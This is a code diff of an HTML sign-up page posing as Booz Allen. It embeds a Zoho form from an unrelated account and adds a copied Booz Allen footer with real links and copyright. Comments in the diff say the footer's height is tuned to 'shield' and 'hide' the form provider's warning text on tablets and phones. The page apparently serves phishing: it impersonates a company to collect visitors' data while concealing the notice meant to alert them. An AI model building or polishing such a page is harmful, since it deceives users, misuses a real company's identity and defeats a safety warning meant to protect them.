@@ -7,6 +7,8 @@
     <title>Sign Up | Booz Allen</title>
     <link rel="icon" href="https://raw.githubusercontent.com/xwzwx/veloc-assets/refs/heads/main/booz-allen.png">
     
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    
     <style>
         /* === 1. ALLOW MAIN PAGE TO SCROLL BUT HIDE SCROLLBAR === */
         html, body {
@@ -14,13 +16,10 @@
             padding: 0;
             font-family: Arial, sans-serif;
             background-color: #0b1118; 
-            
-            /* Hides outer scrollbar in Firefox & Edge/IE */
             scrollbar-width: none; 
             -ms-overflow-style: none; 
         }
 
-        /* Hides outer scrollbar in Chrome, Safari, and modern Edge */
         html::-webkit-scrollbar, body::-webkit-scrollbar {
             display: none;
         }
@@ -29,51 +28,151 @@
         .iframe-wrapper {
             position: relative; 
             width: 100%;
-            height: 1200px; 
+            height: 1250px; 
             overflow: hidden; 
-            
-            /* Magic line that guarantees buttery-smooth finger scrolling on iPhones! */
             -webkit-overflow-scrolling: touch; 
         }
 
         iframe {
             border: 0;
             width: 100%;
-            height: 100%;
+            margin-top: -15px; 
+            height: calc(100% + 15px); 
+            display: block;
         }
 
-        /* === 3. THE BOTTOM SHIELD (DESKTOP) === */
-        .footer-blocker {
+        /* === 3. THE THIN MEGA-FOOTER (ACTING AS THE SHIELD!) === */
+        .booz-footer {
             position: absolute;
-            bottom: 0; 
+            bottom: 0;
             left: 0;
-            
-            /* Dodges the physical scrollbar on PC/Laptops */
             width: calc(100% - 18px); 
-            
-            height: 210px; 
             z-index: 50; 
-            background-color: #0b1118; 
-            pointer-events: none; 
+            font-family: 'Inter', Calibri, Geneva, sans-serif;
+            background-color: #000000; 
+            color: #ffffff; 
+            display: flex;
+            flex-direction: column;
         }
 
-        /* === 4. RESPONSIVE MOBILE FIX === */
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+            padding: 24px 40px 16px; 
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .footer-col h4 {
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #ffffff;
+            margin: 0 0 4px 0; 
+            letter-spacing: 0.2px;
+            white-space: nowrap; /* Prevents headers from wrapping */
+        }
+
+        .footer-col a {
+            display: block;
+            color: #d9d9d9; 
+            font-size: 14px; 
+            padding: 6px 0px; 
+            text-decoration: none;
+            transition: color 0.2s;
+            white-space: nowrap; /* Prevents links from wrapping */
+        }
+
+        .footer-col a:hover {
+            color: #c0c0c0;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #222222; 
+            display: flex;
+            justify-content: center; 
+            align-items: center;
+            position: relative;
+            padding: 12px 40px;
+            font-size: 11px;
+            color: #d9d9d9;
+        }
+
+        .social-links {
+            position: absolute;
+            right: 40px;
+            display: flex;
+            gap: 15px;
+        }
+
+        .social-icon {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 32px;
+            height: 32px;
+            border: 1.5px solid #ffffff;
+            border-radius: 50%;
+            color: #ffffff;
+            text-decoration: none;
+            transition: border-color 0.2s, color 0.2s;
+        }
+
+        .social-icon svg {
+            width: 14px;
+            height: 14px;
+            fill: currentColor;
+        }
+
+        .social-icon:hover {
+            border-color: #c0c0c0;
+            color: #c0c0c0;
+        }
+
+        /* === 4. RESPONSIVE MEDIA QUERIES === */
+        
+        /* 1100px FIX: Shrinks font and padding to stop wrapping! */
+        @media screen and (max-width: 1100px) {
+            .footer-grid {
+                padding: 16px 20px;
+                gap: 10px;
+            }
+            .footer-col h4, .footer-col a {
+                font-size: 12px; /* Slightly smaller text */
+            }
+        }
+
+        /* 900px TABLET FIX: Hides grid, but keeps footer tall to shield the warning! */
+        @media screen and (max-width: 900px) {
+            .footer-grid {
+                display: none; 
+            }
+            .booz-footer {
+                height: 170px; /* Forces black box to stay tall enough to hide warning */
+                justify-content: flex-end; /* Pushes copyright to the bottom */
+            }
+        }
+
+        /* 600px MOBILE FIX: Adjusts for wrapped warning and removes scrollbar gap */
         @media screen and (max-width: 600px) {
-            
             .iframe-wrapper {
-                /* Text wraps on mobile, making the form taller. 
-                   Make sure this is tall enough to reveal the Sign Up button! */
                 height: 1500px; 
             }
-
-            .footer-blocker {
-                height: 240px; 
-                
-                /* CRITICAL MOBILE FIX: Phones do not have 18px physical scrollbars. 
-                   We change this back to 100% so it perfectly touches the right edge of the phone! */
+            .booz-footer {
                 width: 100%; 
+                height: 240px; /* Taller black box to cover wrapped warning text */
             }
-            
+            .footer-bottom {
+                flex-direction: column;
+                gap: 16px;
+                padding: 16px 20px;
+            }
+            .social-links {
+                position: static; 
+            }
         }
     </style>
 </head>
@@ -81,13 +180,76 @@
 
     <div class="iframe-wrapper">
         
-        <!-- The Bottom Shield -->
-        <div class="footer-blocker"></div>
-
         <!-- Your Zoho Form -->
         <iframe src="https://forms.zohopublic.com/velocitygloba1/form/VelocityGlobal/formperma/i3yb8CYWIXQQ_jOulDPdEU6vsbpveDcK3olsdhoNqqU">
         </iframe>
 
+        <!-- === AUTHENTIC BOOZ ALLEN MEGA-FOOTER === -->
+        <div class="booz-footer">
+
+            <!-- OPTIMIZED Link Grid (Text shortened slightly to prevent 1000px wrapping!) -->
+            <div class="footer-grid">
+                <div class="footer-col">
+                    <h4>INFORMATION FOR</h4>
+                    <a href="https://access.bah.com/">Employees</a>
+                    <a href="https://investors.boozallen.com/">Investors</a>
+                    <a href="https://www.boozallen.com/menu/government-contract-vehicles.html">Contract Officers</a>
+                    <a href="https://www.boozallen.com/menu/suppliers-and-small-businesses.html">Suppliers</a>
+                </div>
+                <div class="footer-col">
+                    <h4>INDUSTRIES</h4>
+                    <a href="https://www.boozallen.com/markets/civil-government.html">Govt & Civil Agencies</a>
+                    <a href="https://www.boozallen.com/markets/intelligence.html">Intelligence</a>
+                    <a href="https://www.boozallen.com/markets/health.html">Life Sciences & Health</a>
+                    <a href="https://www.boozallen.com/markets/defense.html">Military</a>
+                </div>
+                <div class="footer-col">
+                    <h4>FEATURED SOLUTIONS</h4>
+                    <a href="https://www.boozallen.com/expertise/artificial-intelligence.html">Artificial Intelligence</a>
+                    <a href="https://www.boozallen.com/expertise/digital-solutions/cloud-solutions.html">Cloud</a>
+                    <a href="https://www.boozallen.com/s/solution/a-solution-for-enterprise-scale-devsecops.html">Ent. DevSecOps</a>
+                    <a href="https://www.boozallen.com/expertise/cybersecurity.html">Security</a>
+                </div>
+                <div class="footer-col">
+                    <h4>ABOUT US</h4>
+                    <a href="https://www.boozallen.com/about.html">About Us</a>
+                    <a href="https://www.boozallen.com/about/empowering-our-people.html">Who We Are</a>
+                    <a href="https://www.boozallen.com/expertise.html">What We Do</a>
+                    <a href="https://www.boozallen.com/careers.html">Join Our Team</a>
+                </div>
+                <div class="footer-col">
+                    <h4>SITE LINKS</h4>
+                    <a href="https://www.boozallen.com/tools/footer-navigation/contact-us.html">Contact Us</a>
+                    <a href="https://www.boozallen.com/tools/footer-navigation/privacy-policy.html">Privacy Statement</a>
+                    <a href="https://www.boozallen.com/tools/footer-navigation/terms-of-use.html">Terms of Use</a>
+                    <a href="https://www.boozallen.com/tools/footer-navigation/cookie-policy.html">Cookie Policy</a>
+                </div>
+            </div>
+
+            <!-- Copyright & Social Line -->
+            <div class="footer-bottom">
+                
+                <div class="copyright-text">
+                    &copy; 2026 Booz Allen Hamilton Inc. All Rights Reserved.
+                </div>
+
+                <div class="social-links">
+                    <a href="https://www.linkedin.com/company/booz-allen-hamilton" target="_blank" class="social-icon" aria-label="LinkedIn">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"/>
+                        </svg>
+                    </a>
+                    <a href="https://x.com/BoozAllen" target="_blank" class="social-icon" aria-label="X (Twitter)">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/>
+                        </svg>
+                    </a>
+                </div>
+
+            </div>
+            
+        </div>
+        
     </div>
     
 </body>
